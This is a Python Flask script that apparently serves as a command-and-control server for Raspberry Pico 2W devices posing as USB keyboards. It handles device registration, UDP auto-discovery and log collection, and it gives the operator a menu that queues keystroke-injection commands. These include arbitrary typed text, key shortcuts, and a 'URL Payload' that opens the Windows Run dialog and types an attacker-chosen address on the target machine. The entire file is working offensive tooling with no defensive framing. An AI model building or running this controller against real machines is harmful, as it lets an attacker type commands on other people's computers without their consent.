import threading
import logging
import os
import socket
from flask import Flask, request, jsonify

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
commands_queue = []
registered_devices = set() # NEW: Tracks active devices

# --- FLASK ROUTES ---
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    registered_devices.add(device_id) # Remember this Pico
    print(f"\n[+] SUCCESS! Pico Registered: {device_id}")
    print("\nSelect an option: ", end="", flush=True) 
    return "OK", 200

@app.route('/poll', methods=['GET'])
def poll():
    global commands_queue
    device_id = request.args.get('device_id')
    
    # NEW: If server restarted, we don't know this device. Force it to re-register!
    if device_id not in registered_devices:
        return jsonify({"error": "not_registered"}), 401

    response = jsonify(commands_queue)
    if commands_queue:
        print("\n[>] Command executed by Pico. Queue cleared.")
        print("\nSelect an option: ", end="", flush=True)
    commands_queue = [] 
    return response

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    print(f"\n[!] LOG FROM PICO: {data.get('log')}")
    print("\nSelect an option: ", end="", flush=True)
    return "OK", 200

# --- THREAD 1: FLASK SERVER ---
def run_flask():
    app.run(host='0.0.0.0', port=8080, use_reloader=False)

# --- THREAD 2: UDP AUTO-DISCOVERY ---
def udp_discovery_listener():
    UDP_PORT = 50000
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', UDP_PORT))
    print("[*] Auto-Discovery Beacon active. Waiting for Picos...")
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if b"DISCOVER_C2" in data:
                sock.sendto(b"C2_HERE", addr)
        except Exception:
            pass

# --- Auto-IP Snippet ---
def get_local_ip():
    """Dynamically finds the laptop's active Wi-Fi IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # This doesn't actually send data, it just checks which interface 
        # would be used to reach an external address.
        s.connect(('8.8.8.8', 1))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address


# --- MAIN THREAD: CONTROL PANEL ---
def main_cli():
    global commands_queue
    # NEW: Detect and display the current Wi-Fi IP
    current_ip = get_local_ip()

    print("\n" + "="*40)
    print("=== Pico 2W Integrated C2 Master ===")
    print(f"[*] SERVER ADDRESS: http://{current_ip}:8080")
    print("[*] Status: Listening for Picos...")
    print("="*40)

    # menu options...
    print("\n=== Pico 2W Integrated C2 Master ===")
    print("1. Send Text (keyboard_string)")
    print("2. Send Shortcut (keyboard_shortcut)")
    print("3. Execute URL Payload (Open Website)")
    print("4. Exit")

    while True:
        choice = input("\nSelect an option: ")
        
        if choice == '1':
            text = input("Enter text to type: ")
            commands_queue.append({"type": "keyboard_string", "text": text + "\n"})
            print("[+] Text command loaded!")
        elif choice == '2':
            keys = input("Enter keys (comma separated, e.g., GUI, R): ").upper()
            key_list = [k.strip() for k in keys.split(",")]
            commands_queue.append({"type": "keyboard_shortcut", "keys": key_list})
            print("[+] Shortcut command loaded!")
        elif choice == '3':
            target_url = input("Enter the URL (e.g., https://www.youtube.com): ")
            commands_queue.append({"type": "keyboard_shortcut", "keys": ["GUI", "R"]})
            commands_queue.append({"type": "delay", "ms": 600})
            commands_queue.append({"type": "keyboard_string", "text": target_url + "\n"})
            print(f"[+] URL Payload loaded for: {target_url}")
        elif choice == '4':
            print("Shutting down C2...")
            os._exit(0)
        else:
            print("Invalid choice.")

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=udp_discovery_listener, daemon=True).start()
    main_cli()